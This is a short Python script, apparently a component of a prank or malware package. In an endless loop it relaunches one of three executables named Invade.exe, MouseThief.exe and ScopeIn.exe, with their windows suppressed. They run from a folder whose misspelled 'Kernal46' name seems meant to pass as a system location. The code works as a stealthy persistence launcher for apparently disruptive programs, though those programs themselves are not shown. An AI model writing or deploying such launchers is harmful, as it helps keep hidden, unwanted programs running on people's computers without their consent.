import os
from time import sleep
import random
import subprocess
import psutil

path = 'C:/Users/Public/Kernal46/DistributePackage'
invade = os.path.join(path, 'Invade.exe')
mouseThief = os.path.join(path, 'MouseThief.exe')
scopeIn = os.path.join(path, 'ScopeIn.exe')

CREATE_NO_WINDOW = 0x08000000
while True:
    count = sum(1 for proc in psutil.process_iter() if proc.name() == 'runner.exe')
    print(count)
    r = (int)(random.random() * 3)
    if (r == 0):
        count = sum(1 for proc in psutil.process_iter() if proc.name() == 'Invade.exe')
        if (count < 1):
            print('invade')
            subprocess.call(invade, creationflags = CREATE_NO_WINDOW)
        else:
            print('alreading running invade')
    if (r == 1):
        count = sum(1 for proc in psutil.process_iter() if proc.name() == 'MouseThief.exe')
        if (count < 1):
            print('mouseThief')
            subprocess.call(mouseThief, creationflags = CREATE_NO_WINDOW)
        else:
            print('alreading running mouseThief')
    if (r == 2):
        count = sum(1 for proc in psutil.process_iter() if proc.name() == 'ScopeIn.exe')
        if (count < 1):
            print('scopeIn')
            subprocess.call(scopeIn, creationflags = CREATE_NO_WINDOW)
        else:
            print('already running scopeIn')
    sleep(10)